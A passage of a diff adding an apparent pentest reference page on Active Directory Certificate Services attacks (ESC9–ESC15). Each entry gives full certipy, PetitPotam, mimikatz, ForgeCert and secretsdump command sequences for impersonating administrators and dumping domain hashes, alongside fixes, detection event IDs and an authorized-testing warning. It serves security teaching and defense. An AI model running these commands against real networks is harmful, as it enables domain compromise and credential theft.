+find:`<span class="cd">Get-DomainObjectAcl</span> <span class="cf">-SearchBase</span> <span class="cv">"CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local"</span> <span class="cf">-ResolveGUIDs</span>
+<span class="cc"># Look for Write/GenericAll on NTAuthCertificates, Certification Authorities, Enrollment Services</span>
+<span class="cd">certipy</span> find <span class="cf">-u</span> <span class="cv">user@corp.local</span> <span class="cf">-p</span> <span class="cv">pass</span> <span class="cf">-vulnerable</span>`,
+exploit_steps:['Get write access on NTAuthCertificates (via ACL misconfiguration)','Create a rogue CA certificate (openssl)','Add rogue CA cert to NTAuthCertificates','Issue arbitrary certs from rogue CA as any user','Authenticate with issued certs'],
+exploit:`<span class="cc"># Add rogue CA to NTAuthCertificates</span>
+<span class="cd">certutil</span> <span class="cf">-dspublish</span> <span class="cv">rogueCA.crt</span> NTAuthCA
+<span class="cc"># Then issue certs offline using ForgeCert with rogue CA key</span>`,
+fixes:['Restrict Write to NTAuthCertificates to Enterprise Admins only','Enable SACL auditing on NTAuthCertificates for any modifications','Periodically enumerate trusted CAs with certutil -viewstore ldap:///CN=NTAuthCertificates...']},
+
+esc9:{id:'ESC9',name:'No security extension / UPN collision',sev:'high',
+tags:['szOID_NTDS_CA_SECURITY_EXT','KB5014754','UPN-collision','weak-mapping'],
+overview:`ESC9 exploits the absence of the <span class="inline-code">szOID_NTDS_CA_SECURITY_EXT</span> SID security extension in issued certificates. Without this extension, DCs fall back to UPN-based certificate mapping. An attacker who can modify a controlled account's UPN to match a target's UPN can obtain a cert that the DC maps to the target during authentication.`,
+how:`When a cert lacks the SID extension, the DC maps the cert to an account by matching the UPN in the cert's SAN to an account's <span class="inline-code">userPrincipalName</span>. If you have GenericWrite on any account, you change its UPN to match the target (say administrator@corp.local), request a cert, restore the original UPN, then use the cert to auth as the target.`,
+dangers:`UPN collision attacks require no template SAN flag, no CA flag — just the ability to modify a UPN (GenericWrite on any account) and a CA in pre-enforcement mode.`,
+find:`<span class="cd">certipy</span> find <span class="cf">-u</span> <span class="cv">user@corp.local</span> <span class="cf">-p</span> <span class="cv">pass</span> <span class="cf">-vulnerable</span>
+<span class="cc"># Check: CT_FLAG_NO_SECURITY_EXTENSION on templates</span>
+<span class="cc"># Check: StrongCertificateBindingEnforcement = 0 or 1 (not 2) on DCs</span>
+<span class="cd">reg query</span> <span class="cv">HKLM\SYSTEM\CurrentControlSet\Services\Kdc</span> <span class="cf">/v</span> <span class="cv">StrongCertificateBindingEnforcement</span>`,
+exploit_steps:['Confirm CT_FLAG_NO_SECURITY_EXTENSION on template or CA in compat mode','Change controlled account UPN to match target (e.g. administrator@corp.local)','Request cert for controlled account','Restore original UPN','Auth with cert — DC maps to administrator via UPN'],
+exploit:`<span class="cd">Set-DomainObject</span> <span class="cf">-Identity</span> <span class="cv">victimuser</span> <span class="cf">-Set</span> @{<span class="cv">userprincipalname</span>=<span class="cv">'administrator@corp.local'</span>}
+<span class="cd">certipy</span> req <span class="cf">-u</span> <span class="cv">victimuser@corp.local</span> <span class="cf">-p</span> <span class="cv">pass</span> <span class="cf">-ca</span> <span class="cv">CORP-CA</span> <span class="cf">-template</span> <span class="cv">VulnTemplate</span> <span class="cf">-dc-ip</span> <span class="cv">10.10.10.5</span>
+<span class="cd">Set-DomainObject</span> <span class="cf">-Identity</span> <span class="cv">victimuser</span> <span class="cf">-Set</span> @{<span class="cv">userprincipalname</span>=<span class="cv">'victimuser@corp.local'</span>}
+<span class="cd">certipy</span> auth <span class="cf">-pfx</span> <span class="cv">administrator.pfx</span> <span class="cf">-username</span> <span class="cv">administrator</span> <span class="cf">-dc-ip</span> <span class="cv">10.10.10.5</span>`,
+fixes:['Apply KB5014754 and move StrongCertificateBindingEnforcement to 2 (Full Enforcement)','Remove CT_FLAG_NO_SECURITY_EXTENSION from templates','Monitor userPrincipalName changes — alert on UPN set to match another user']},
+
+esc10:{id:'ESC10',name:'Weak certificate mapping (registry)',sev:'high',
+tags:['CertificateMappingMethods','UseSubjectAltName','Schannel','LDAP-auth'],
+overview:`ESC10 covers two registry-based weak mapping scenarios on DCs. Case 1: <span class="inline-code">CertificateMappingMethods</span> includes UPN mapping (0x4), enabling UPN-based auth bypass. Case 2: <span class="inline-code">UseSubjectAltName = 1</span> in LDAP/NTDS settings enables SAN-based mapping for LDAP certificate auth.`,
+how:`These are DC Schannel and LDAP server settings. When UPN or SAN mapping is enabled, a certificate containing a target's UPN or DNS name in its SAN/subject can be used to authenticate as that account. Often combined with ESC9-style UPN collision or ESC1-style SAN forgery to get the right cert contents.`,
+dangers:`Affects both Kerberos PKINIT and LDAP certificate-based authentication. LDAP with cert auth can grant full AD write access in some configurations.`,
+find:`<span class="cd">reg query</span> <span class="cv">"HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\Schannel"</span> <span class="cf">/v</span> <span class="cv">CertificateMappingMethods</span>
+<span class="cc"># 0x1F = all methods enabled (bad); 0x18 = safe (S4U + explicit only)</span>
+<span class="cd">reg query</span> <span class="cv">"HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters"</span> <span class="cf">/v</span> <span class="cv">UseSubjectAltName</span>
+<span class="cc"># 1 = vulnerable</span>
+<span class="cd">certipy</span> find <span class="cf">-u</span> <span class="cv">user@corp.local</span> <span class="cf">-p</span> <span class="cv">pass</span> <span class="cf">-vulnerable</span>`,
+exploit_steps:['Confirm vulnerable registry settings','Obtain cert with target UPN/SAN (chain with ESC9)','Use cert for Schannel LDAP auth or PKINIT as target'],
+exploit:`<span class="cc"># After obtaining cert via ESC9 or ESC1 chain</span>
+<span class="cd">certipy</span> auth <span class="cf">-pfx</span> <span class="cv">admin.pfx</span> <span class="cf">-ldap-shell</span> <span class="cf">-dc-ip</span> <span class="cv">10.10.10.5</span>
+<span class="cc"># LDAP shell allows AD modifications as admin</span>`,
+fixes:['Set CertificateMappingMethods = 0x18 (remove UPN/SAN weak methods)','Set UseSubjectAltName = 0 in NTDS Parameters','Apply KB5014754 full enforcement']},
+
+esc11:{id:'ESC11',name:'NTLM relay via RPC enrollment (IF_REQUESTID)',sev:'high',
+tags:['RPC-relay','ICertRequest','DCOM','post-ESC8-mitigation'],
+overview:`ESC11 is the RPC equivalent of ESC8. Instead of relaying to the HTTP /certsrv/ endpoint, the attacker relays to the CA's RPC-based enrollment interface (ICertRequest over DCOM). Organizations that mitigated ESC8 by disabling Web Enrollment may still be vulnerable via RPC relay.`,
+how:`The CA exposes an RPC interface on port 135 + dynamic high ports for certificate enrollment. Without RPC packet privacy/integrity enforcement, NTLM credentials relayed to this interface allow enrollment as the victim. Same coercion techniques apply — PetitPotam, PrinterBug, Coercer.`,
+dangers:`Post-ESC8 environments may be unguarded. RPC is always enabled (can't disable it without breaking AD itself), so this attack surface is always present unless the interface is hardened.`,
+find:`<span class="cd">certipy</span> find <span class="cf">-u</span> <span class="cv">user@corp.local</span> <span class="cf">-p</span> <span class="cv">pass</span> <span class="cf">-vulnerable</span>
+<span class="cc"># Look for ESC11 flag in CA section</span>
+<span class="cd">nmap</span> <span class="cf">-p</span> <span class="cv">135</span> <span class="cf">-sV</span> <span class="cv">CA-IP</span>`,
+exploit_steps:['Start certipy relay targeting RPC interface (not HTTP)','Coerce DC auth with PetitPotam / Coercer','Relay catches → gets DC machine cert','Auth with DC cert → DCSync'],
+exploit:`<span class="cc"># Terminal 1: RPC relay via certipy</span>
+<span class="cd">certipy</span> relay <span class="cf">-ca</span> <span class="cv">CA-IP</span> <span class="cf">-template</span> <span class="cv">DomainController</span>
+<span class="cc"># Terminal 2: Coerce</span>
+<span class="cd">python3 PetitPotam.py</span> <span class="cv">ATTACKER-IP DC-IP</span>
+<span class="cd">certipy</span> auth <span class="cf">-pfx</span> <span class="cv">dc01.pfx</span> <span class="cf">-dc-ip</span> <span class="cv">10.10.10.5</span>`,
+fixes:['Enforce RPC packet privacy on CA ICertRequest interface','Apply KB5005413 (PetitPotam) and restrict EFSRPC','Disable Spooler on DCs']},
+
+esc15:{id:'ESC15',name:'Schema version 1 template EKU bypass (CVE-2024-49019)',sev:'high',
+tags:['schema-v1','Application-Policies','EKU-bypass','CVE-2024-49019'],
+overview:`ESC15 (CVE-2024-49019, patched Nov 2024) targets schema version 1 certificate templates. In v1 templates, the requester can supply an Application Policies extension in the CSR that the CA includes verbatim in the issued cert — overriding what the template normally specifies. This lets an attacker request a cert with Client Authentication EKU from any v1 template, combined with ESC1-style SAN abuse.`,
+how:`Schema v1 templates (the original template format from pre-Server 2003) don't enforce EKU restrictions as strictly as v2/v3. The built-in "User" template is schema v1 and is enrolled by Domain Users on almost every domain. With this bug, you can submit a CSR that says "I want Client Authentication" and the CA will include it. If SAN is also user-supplied, it's a full ESC1 equivalent.`,
+dangers:`The built-in User template is the attack surface — it's enabled everywhere. Pre-patch environments (before Nov 2024 update) are fully exposed.`,
+find:`<span class="cd">Get-DomainObject</span> <span class="cf">-SearchBase</span> <span class="cv">"CN=Certificate Templates,..."</span> | ? { <span class="cv">$_</span>.<span class="cv">'msPKI-Template-Schema-Version'</span> <span class="cf">-eq</span> <span class="cv">1</span> }
+<span class="cd">certipy</span> find <span class="cf">-u</span> <span class="cv">user@corp.local</span> <span class="cf">-p</span> <span class="cv">pass</span> <span class="cf">-vulnerable</span>`,
+exploit_steps:['Find schema v1 template with low-priv enrollment (default User template usually qualifies)','Submit CSR with Application Policies = Client Authentication AND admin UPN as SAN','Cert is issued with your specified EKU and SAN','Auth with resulting .pfx'],
+exploit:`<span class="cd">certipy</span> req <span class="cf">-u</span> <span class="cv">lowpriv@corp.local</span> <span class="cf">-p</span> <span class="cv">pass</span> \\
+  <span class="cf">-ca</span> <span class="cv">CORP-CA</span> <span class="cf">-template</span> <span class="cv">User</span> \\
+  <span class="cf">-application-policies</span> <span class="cv">ClientAuthentication</span> \\
+  <span class="cf">-upn</span> <span class="cv">administrator@corp.local</span> <span class="cf">-dc-ip</span> <span class="cv">10.10.10.5</span>
+<span class="cd">certipy</span> auth <span class="cf">-pfx</span> <span class="cv">administrator.pfx</span> <span class="cf">-dc-ip</span> <span class="cv">10.10.10.5</span>`,
+fixes:['Apply November 2024 security updates (CVE-2024-49019 patch)','Upgrade v1 templates to v2/v3 schema','Remove broad enrollment rights from v1 templates']},
+
+esc12:{id:'ESC12',name:'CA private key exposure via CSP/HSM',sev:'medium',
+tags:['CSP','HSM','ForgeCert','offline-forging','CA-private-key'],
+overview:`ESC12 covers scenarios where the CA's private key is accessible to a local admin on the CA server — either because the key is exportable, the CSP uses default credentials, or the key is DPAPI-protected and recoverable using domain backup keys. With the CA private key, an attacker can forge certificates entirely offline, forever.`,
+how:`The CA private key is normally protected by the cryptographic service provider (CSP or KSP). Software-based CSPs store keys in the registry under DPAPI protection. If an attacker has local admin on the CA (obtained separately), they can extract the DPAPI-protected key using the domain backup key (via Mimikatz or SharpDPAPI), then use ForgeCert to sign arbitrary certificates offline — with no CA logs, no network traffic, no trace.`,
+dangers:`The most persistent CA compromise possible. Revocation is useless unless the CA itself is retired and a new one created. Works from an air-gapped machine indefinitely. Every identity in the domain can be impersonated.`,
+find:`<span class="cd">certutil</span> <span class="cf">-config</span> <span class="cv">"CORP-CA"</span> <span class="cf">-getreg</span> <span class="cv">CA\CSP\Provider</span>
+<span class="cc"># Check if software CSP (Microsoft RSA/Schannel CSP = extractable via DPAPI)</span>
+<span class="cd">certutil</span> <span class="cf">-store</span> My
+<span class="cc"># Check if CA cert marked as exportable</span>`,
+exploit_steps:['Gain local admin on CA (separate attack path)','Extract DPAPI master key using domain backup key','Use SharpDPAPI to decrypt CA private key','Bundle CA cert + private key into .pfx','Use ForgeCert to sign arbitrary certs offline','Authenticate with forged certs'],
+exploit:`<span class="cc"># Extract domain DPAPI backup key (requires DA)</span>
+<span class="cd">mimikatz</span> <span class="cv">lsadump::backupkeys /system:DC-IP /export</span>
+
+<span class="cc"># Extract CA key with SharpDPAPI</span>
+<span class="cd">SharpDPAPI.exe</span> certificates <span class="cf">/pvk:</span><span class="cv">domain_backup_key.pvk</span>
+
+<span class="cc"># Forge cert offline</span>
+<span class="cd">ForgeCert.exe</span> \\
+  <span class="cf">--CaCertPath</span> <span class="cv">ca.pfx</span> <span class="cf">--CaCertPassword</span> <span class="cv">pass</span> \\
+  <span class="cf">--Subject</span> <span class="cv">"CN=Administrator"</span> \\
+  <span class="cf">--SubjectAltName</span> <span class="cv">administrator@corp.local</span> \\
+  <span class="cf">--NewCertPath</span> <span class="cv">forged_admin.pfx</span> <span class="cf">--NewCertPassword</span> <span class="cv">forgedpass</span>
+<span class="cd">certipy</span> auth <span class="cf">-pfx</span> <span class="cv">forged_admin.pfx</span> <span class="cf">-dc-ip</span> <span class="cv">10.10.10.5</span>`,
+fixes:['Use hardware HSM with non-exportable keys for CA private key storage','Restrict local admin on CA server to absolute minimum (treat CA as Tier 0)','Do not domain-join the CA if possible — use a standalone CA']}
+};
+
+D.tools = () => `<div>
+<div class="section-title"><i class="ti ti-terminal-2" aria-hidden="true"></i>Tool reference — commands, outputs, and when to use each</div>
+<div class="card">
+<p style="font-size:13px;color:#79c0ff;font-weight:500;margin-bottom:8px">Certipy — the primary tool (Python, Linux)</p>
+<p>Install: <span class="inline-code">pip3 install certipy-ad</span> | Author: Oliver Lyak (ly4k) | Covers 95% of ADCS attacks from Linux.</p>
+<div class="code-block"><span class="cc">── FIND (enumerate all ADCS) ─────────────────────────────────────────</span>
+<span class="cd">certipy</span> find <span class="cf">-u</span> <span class="cv">user@corp.local</span> <span class="cf">-p</span> <span class="cv">pass</span> <span class="cf">-dc-ip</span> <span class="cv">10.10.10.5</span> <span class="cf">-vulnerable</span> <span class="cf">-stdout</span>
+<span class="cc"># -stdout      : print to terminal (good for quick review)</span>
+<span class="cc"># -vulnerable  : only show templates/CAs with issues</span>
+<span class="cc"># Without flags: saves corp.local_Certipy.txt + .json + .zip (BloodHound)</span>
+
+<span class="cc">── REQ (request a certificate) ───────────────────────────────────────</span>
+<span class="cd">certipy</span> req <span class="cf">-u</span> <span class="cv">user@corp.local</span> <span class="cf">-p</span> <span class="cv">pass</span> <span class="cf">-ca</span> <span class="cv">CORP-CA</span> <span class="cf">-template</span> <span class="cv">User</span>
+<span class="cf">  -upn</span> <span class="cv">admin@corp.local</span>        <span class="cc"># ESC1: supply SAN UPN</span>
+<span class="cf">  -on-behalf-of</span> <span class="cv">'CORP\admin'</span>  <span class="cc"># ESC3: enroll for another user</span>
+<span class="cf">  -pfx</span> <span class="cv">ea.pfx</span>                  <span class="cc"># ESC3: use EA cert for stage 2</span>
+<span class="cf">  -application-policies</span> <span class="cv">ClientAuthentication</span> <span class="cc"># ESC15</span>
+
+<span class="cc">── AUTH (authenticate with .pfx) ─────────────────────────────────────</span>
+<span class="cd">certipy</span> auth <span class="cf">-pfx</span> <span class="cv">admin.pfx</span> <span class="cf">-dc-ip</span> <span class="cv">10.10.10.5</span>
+<span class="cc"># Output: admin.ccache (TGT) + NT hash printed to terminal</span>
+<span class="cd">certipy</span> auth <span class="cf">-pfx</span> <span class="cv">admin.pfx</span> <span class="cf">-ldap-shell</span> <span class="cf">-dc-ip</span> <span class="cv">10.10.10.5</span>
+<span class="cc"># Opens interactive LDAP shell: add-computer, set-rbcd, set-shadow-credentials</span>
+
+<span class="cc">── CA (CA management — ESC7) ─────────────────────────────────────────</span>
+<span class="cd">certipy</span> ca <span class="cf">-u</span> <span class="cv">user@corp.local</span> <span class="cf">-p</span> <span class="cv">pass</span> <span class="cf">-ca</span> <span class="cv">CORP-CA</span> <span class="cf">-dc-ip</span> <span class="cv">10.10.10.5</span>
+<span class="cf">  -add-officer</span> <span class="cv">user</span>           <span class="cc"># Grant self Officer rights</span>
+<span class="cf">  -enable-template</span> <span class="cv">SubCA</span>     <span class="cc"># Enable SubCA template</span>
+<span class="cf">  -issue-request</span> <span class="cv">12</span>          <span class="cc"># Approve request ID 12</span>
+<span class="cf">  -retrieve</span> <span class="cv">12</span>               <span class="cc"># Download issued cert by ID</span>
+
+<span class="cc">── TEMPLATE (modify template — ESC4) ────────────────────────────────</span>
+<span class="cd">certipy</span> template <span class="cf">-u</span> <span class="cv">user@corp.local</span> <span class="cf">-p</span> <span class="cv">pass</span> <span class="cf">-template</span> <span class="cv">CorpTemplate</span>
+<span class="cf">  -save-old</span>                   <span class="cc"># Save original as CorpTemplate.json before modifying</span>
+<span class="cf">  -configuration</span> <span class="cv">CorpTemplate.json</span> <span class="cc"># Restore from saved backup</span>
+
+<span class="cc">── RELAY (NTLM relay — ESC8/ESC11) ──────────────────────────────────</span>
+<span class="cd">certipy</span> relay <span class="cf">-ca</span> <span class="cv">CA-IP</span> <span class="cf">-template</span> <span class="cv">DomainController</span>
+<span class="cc"># Listens on port 445 for NTLM, relays to CA</span>
+<span class="cc"># Combine with PetitPotam/Coercer in another terminal</span></div>
+</div>
+<div class="card" style="margin-top:10px">
+<p style="font-size:13px;color:#ffa657;font-weight:500;margin-bottom:8px">Impacket suite — post-exploitation</p>
+<div class="code-block"><span class="cc"># secretsdump — domain hash dump (needs DA hash or TGT)</span>
+<span class="cd">secretsdump.py</span> <span class="cf">-hashes</span> <span class="cv">:NTLM_HASH</span> <span class="cv">corp.local/administrator@DC-IP</span>
+<span class="cd">secretsdump.py</span> <span class="cf">-k</span> <span class="cf">-no-pass</span> <span class="cv">corp.local/administrator@DC-IP</span>  <span class="cc"># use ccache</span>
+<span class="cd">export</span> KRB5CCNAME=<span class="cv">administrator.ccache</span>  <span class="cc"># set before -k usage</span>
+
+<span class="cc"># ntlmrelayx — relay (alternative to certipy relay for ESC8)</span>
+<span class="cd">ntlmrelayx.py</span> <span class="cf">-t</span> <span class="cv">http://CA-IP/certsrv/certfnsh.asp</span> <span class="cf">--adcs</span> <span class="cf">--template</span> <span class="cv">DomainController</span>
+<span class="cc"># Output: base64 cert blob → decode → .pfx → certipy auth</span>
+
+<span class="cc"># psexec / smbexec / evil-winrm — shell as admin</span>
+<span class="cd">psexec.py</span> <span class="cf">-hashes</span> <span class="cv">:NTLM_HASH</span> <span class="cv">corp.local/administrator@DC-IP</span>
+<span class="cd">evil-winrm</span> <span class="cf">-i</span> <span class="cv">DC-IP</span> <span class="cf">-u</span> <span class="cv">administrator</span> <span class="cf">-H</span> <span class="cv">NTLM_HASH</span></div>
+</div>
+<div class="card" style="margin-top:10px">
+<p style="font-size:13px;color:#7ee787;font-weight:500;margin-bottom:8px">Coercion tools — essential for ESC8/ESC11</p>
+<div class="code-block"><span class="cc"># Coercer — tries all coercion methods automatically</span>
+<span class="cd">pip3</span> install coercer
+<span class="cd">python3 Coercer.py</span> coerce <span class="cf">-l</span> <span class="cv">ATTACKER-IP</span> <span class="cf">-t</span> <span class="cv">DC-IP</span> \\
+  <span class="cf">-u</span> <span class="cv">user</span> <span class="cf">-p</span> <span class="cv">pass</span> <span class="cf">-d</span> <span class="cv">corp.local</span>
+
+<span class="cc"># PetitPotam — EFS/EFSRPC coercion (pre-patch: unauthenticated)</span>
+<span class="cd">python3 PetitPotam.py</span> <span class="cv">ATTACKER-IP DC-IP</span>              <span class="cc"># unauth</span>
+<span class="cd">python3 PetitPotam.py</span> <span class="cf">-u</span> <span class="cv">user</span> <span class="cf">-p</span> <span class="cv">pass</span> <span class="cv">ATTACKER-IP DC-IP</span>  <span class="cc"># authed</span>
+
+<span class="cc"># PrinterBug / dementor.py — Spooler service coercion</span>
+<span class="cd">python3 dementor.py</span> <span class="cf">-u</span> <span class="cv">user</span> <span class="cf">-p</span> <span class="cv">pass</span> <span class="cf">-d</span> <span class="cv">corp.local</span> <span class="cv">ATTACKER-IP DC-IP</span></div>
+</div>
+<div class="card" style="margin-top:10px">
+<p style="font-size:13px;color:#d2a8ff;font-weight:500;margin-bottom:8px">Windows-side tools (Certify.exe + Rubeus) — for Windows foothold</p>
+<div class="code-block"><span class="cc"># Certify.exe — enumerate from Windows</span>
+<span class="cd">Certify.exe</span> find /vulnerable
+<span class="cd">Certify.exe</span> cas
+<span class="cd">Certify.exe</span> request /ca:<span class="cv">CORP-CA</span> /template:<span class="cv">VulnTemplate</span> /altname:<span class="cv">administrator</span>
+<span class="cd">Certify.exe</span> request /ca:<span class="cv">CORP-CA</span> /template:<span class="cv">User</span> /onbehalfof:<span class="cv">CORP\administrator</span> /enrollcert:<span class="cv">ea.pfx</span>
+
+<span class="cc"># Rubeus.exe — Kerberos / PKINIT from Windows</span>
+<span class="cd">Rubeus.exe</span> asktgt /user:<span class="cv">administrator</span> /certificate:<span class="cv">admin.pfx</span> /password:<span class="cv">""</span> /ptt
+<span class="cd">Rubeus.exe</span> asktgt /user:<span class="cv">administrator</span> /certificate:<span class="cv">admin.pfx</span> /getcredentials
+<span class="cc"># /ptt = pass-the-ticket (loads TGT into memory immediately)</span>
+<span class="cc"># /getcredentials = dumps NT hash via PKINIT U2U</span></div>
+</div>
+</div>`;
+
+D.detect = () => `<div>
+<div class="section-title"><i class="ti ti-shield-check" aria-hidden="true"></i>Detection, hardening, and blue team perspective</div>
+<div class="danger-box"><i class="ti ti-alert-triangle" aria-hidden="true" style="font-size:15px;flex-shrink:0;margin-top:1px"></i><div>Only test in authorized environments. Always have a signed scope of work. On client engagements, coordinate certificate requests with the client's blue team to avoid revoking real user certs during incident response.</div></div>
+<div class="card">
+<p style="font-size:13px;font-weight:500;color:#e6edf3;margin-bottom:8px">Key Windows event IDs for ADCS detection</p>
+<div class="code-block"><span class="cv">4886</span> — CA received a certificate request (logs requester, template)
+<span class="cv">4887</span> — CA issued a certificate (logs serial number, subject)
+<span class="cv">4888</span> — CA denied a certificate request
+<span class="cv">4899</span> — Certificate template was updated (ESC4 indicator)
+<span class="cv">4898</span> — Certificate Services loaded a template
+<span class="cv">4768</span> — Kerberos TGT request: check PreAuthType 17/18 = PKINIT
+         If certificate subject ≠ requestor → ESC1/ESC6 indicator
+<span class="cv">4624</span> — Logon: Type 3 + NTLM targeting certsrv = ESC8 relay
+<span class="cv">5136</span> — AD object modification: changes to msPKI-Certificate-Name-Flag
+         or NTAuthCertificates = ESC4/ESC5 indicator</div>
+</div>
+<div class="card" style="margin-top:8px">
+<p style="font-size:13px;font-weight:500;color:#e6edf3;margin-bottom:8px">Enable CA auditing (required — off by default)</p>
+<div class="code-block"><span class="cc"># Enable all ADCS audit events on CA server</span>
+<span class="cd">auditpol</span> /set /subcategory:<span class="cv">"Certification Services"</span> /success:enable /failure:enable
+
+<span class="cc"># Enable CA object audit logging via certutil</span>
+<span class="cd">certutil</span> <span class="cf">-setreg</span> CA\AuditFilter <span class="cv">127</span>
+<span class="cc"># 127 = all events: requests, revocations, config changes, key archival, OCSP</span>
+<span class="cd">net stop</span> certsvc && <span class="cd">net start</span> certsvc</div>
+</div>
+<div class="card" style="margin-top:8px">
+<p style="font-size:13px;font-weight:500;color:#e6edf3;margin-bottom:8px">Hardening checklist</p>
+<div class="fix-item"><i class="ti ti-circle-check fix-icon" aria-hidden="true"></i><div>Run <span class="inline-code">certipy find -vulnerable</span> or PSPKIAudit quarterly against all CAs</div></div>
+<div class="fix-item"><i class="ti ti-circle-check fix-icon" aria-hidden="true"></i><div>Apply KB5014754 → set <span class="inline-code">StrongCertificateBindingEnforcement = 2</span> on all DCs</div></div>
+<div class="fix-item"><i class="ti ti-circle-check fix-icon" aria-hidden="true"></i><div>Disable NTLM on Web Enrollment / enforce HTTPS + EPA on IIS</div></div>
+<div class="fix-item"><i class="ti ti-circle-check fix-icon" aria-hidden="true"></i><div>Remove Domain Users / Authenticated Users from template enrollment ACLs</div></div>
+<div class="fix-item"><i class="ti ti-circle-check fix-icon" aria-hidden="true"></i><div>Disable Spooler service on all DCs (blocks PrinterBug coercion)</div></div>
+<div class="fix-item"><i class="ti ti-circle-check fix-icon" aria-hidden="true"></i><div>Audit NTAuthCertificates content regularly</div></div>
+<div class="fix-item"><i class="ti ti-circle-check fix-icon" aria-hidden="true"></i><div>Alert on UPN changes — flag any account changing UPN to match another account</div></div>
+<div class="fix-item"><i class="ti ti-circle-check fix-icon" aria-hidden="true"></i><div>Enable auditing on Configuration partition objects for SACL changes</div></div>
+<div class="fix-item"><i class="ti ti-circle-check fix-icon" aria-hidden="true"></i><div>Ingest ADCS certipy BloodHound data — use BH Enterprise for attack path alerts</div></div>
+</div>
+</div>`;
+
+D.logging = () => `<div>
+<div class="section-title"><i class="ti ti-notebook" aria-hidden="true"></i>Logging, screenshots, and report-writing for ADCS engagements</div>
+<div class="info-box"><i class="ti ti-bulb" aria-hidden="true" style="font-size:15px;flex-shrink:0;margin-top:1px"></i><div>Evidence quality makes or breaks your report. Screenshot everything before you exploit — a screenshot of the vulnerability is often more important than one showing it exploited.</div></div>
+
+<div class="card">
+<p style="font-size:13px;font-weight:500;color:#e6edf3;margin-bottom:8px">Terminal logging — capture everything automatically</p>
+<div class="code-block"><span class="cc"># Method 1: script (recommended — captures full terminal session)</span>
+<span class="cd">script</span> <span class="cf">-a</span> <span class="cf">-t</span> <span class="cv">timing.log</span> <span class="cv">session.log</span>
+<span class="cc"># Everything you type and see is saved to session.log</span>
+<span class="cc"># -a = append (don't overwrite if you run script twice)</span>
+<span class="cc"># Stop with: exit or Ctrl+D</span>
+
+<span class="cc"># Method 2: tee (pipe output to file + screen simultaneously)</span>
+<span class="cd">certipy</span> find <span class="cf">-u</span> <span class="cv">user@corp.local</span> <span class="cf">-p</span> <span class="cv">pass</span> <span class="cf">-vulnerable</span> 2>&1 | <span class="cd">tee</span> <span class="cv">certipy_enum_$(date +%Y%m%d_%H%M%S).txt</span>
+
+<span class="cc"># Method 3: tmux with logging enabled</span>
+<span class="cd">tmux</span> new-session <span class="cf">-s</span> <span class="cv">pentest</span>
+<span class="cc"># In tmux: Ctrl+B then : then "pipe-pane -o 'cat >>~/tmux_session.log'"</span>
+
+<span class="cc"># Name files with timestamp + target + ESC number for easy sorting</span>
+<span class="cc"># Convention: YYYYMMDD_HHMMSS_TARGET_ACTION.txt</span>
+<span class="cc"># Example: 20241215_143022_CORP_certipy_esc1_exploit.txt</span></div>
+</div>
+
+<div class="card" style="margin-top:8px">
+<p style="font-size:13px;font-weight:500;color:#e6edf3;margin-bottom:8px">Screenshot workflow — what to capture and when</p>
+<div class="step-list">
+<li><span class="step-num red">1</span><div><strong style="font-weight:500;color:#e6edf3">Before exploit: certipy find output</strong> — Screenshot the full vulnerable template section showing ESC type, template name, enrollment rights, and flags. This is your "vulnerability exists" evidence.</div></li>
+<li><span class="step-num red">2</span><div><strong style="font-weight:500;color:#e6edf3">During exploit: the req command and output</strong> — Screenshot certipy req output showing the Request ID and the UPN in the cert. Proves the CA accepted the malicious request.</div></li>
+<li><span class="step-num red">3</span><div><strong style="font-weight:500;color:#e6edf3">Post-exploit: certipy auth output</strong> — Screenshot showing the NT hash obtained and the TGT issued. This is your "impact demonstrated" evidence.</div></li>
+<li><span class="step-num amber">4</span><div><strong style="font-weight:500;color:#e6edf3">Proof of access: secretsdump or whoami</strong> — Screenshot of secretsdump output (blur sensitive hashes in final report) or a <span class="inline-code">whoami /all</span> from a DA shell. Proves full domain compromise.</div></li>
+<li><span class="step-num amber">5</span><div><strong style="font-weight:500;color:#e6edf3">Remediation baseline: certipy find before fix</strong> — Run find again and save output so the client can confirm remediation later by comparing.</div></li>
+</ul>
+<div class="code-block"><span class="cc"># Linux screenshot tools</span>
+<span class="cd">flameshot</span> gui              <span class="cc"># best: region select + annotation</span>
+<span class="cd">gnome-screenshot</span> <span class="cf">-a</span>       <span class="cc"># built-in region capture</span>
+<span class="cd">scrot</span> <span class="cv">evidence_$(date +%s).png</span> <span class="cc"># quick full-screen</span>
+
+<span class="cc"># Windows (on foothold)</span>
+<span class="cv">Win+Shift+S</span>               <span class="cc"># Snipping tool region</span>
+<span class="cv">PrtSc</span> → paste in Paint    <span class="cc"># quick and dirty</span></div>
+</div>
+
+<div class="card" style="margin-top:8px">
+<p style="font-size:13px;font-weight:500;color:#e6edf3;margin-bottom:8px">Note-taking tools and structure</p>
+<div class="step-list">
+<li><span class="step-num" style="background:rgba(121,192,255,0.1);color:#79c0ff;border-color:rgba(121,192,255,0.25)"><i class="ti ti-star" style="font-size:11px" aria-hidden="true"></i></span><div><strong style="font-weight:500;color:#e6edf3">Obsidian (recommended)</strong> — Local markdown vault, free, supports canvas for attack path diagrams. Create one note per finding with a template. Supports embedding screenshots. Works offline. Use the "Templater" plugin for consistent finding structure.</div></li>
+<li><span class="step-num" style="background:rgba(121,192,255,0.1);color:#79c0ff;border-color:rgba(121,192,255,0.25)"><i class="ti ti-star" style="font-size:11px" aria-hidden="true"></i></span><div><strong style="font-weight:500;color:#e6edf3">CherryTree</strong> — Tree-structured notes, great for hierarchical engagement notes, stores everything in one .ctb file. Built-in syntax highlighting for code blocks.</div></li>
+<li><span class="step-num" style="background:rgba(121,192,255,0.1);color:#79c0ff;border-color:rgba(121,192,255,0.25)"><i class="ti ti-star" style="font-size:11px" aria-hidden="true"></i></span><div><strong style="font-weight:500;color:#e6edf3">Notion / Joplin</strong> — Notion for collaborative team engagements (shared with team in real-time). Joplin as an offline Notion alternative with E2E encryption.</div></li>
+<li><span class="step-num" style="background:rgba(121,192,255,0.1);color:#79c0ff;border-color:rgba(121,192,255,0.25)"><i class="ti ti-star" style="font-size:11px" aria-hidden="true"></i></span><div><strong style="font-weight:500;color:#e6edf3">pwndoc / WriteHat / Ghostwriter</strong> — Purpose-built pentest report management platforms. Ghostwriter integrates with tooling and tracks findings as a project-management-style database. Used at professional firms.</div></li>
+</ul>
+</div>
+
+<div class="card" style="margin-top:8px">
+<p style="font-size:13px;font-weight:500;color:#e6edf3;margin-bottom:8px">Finding note template — use this for every ESC finding</p>
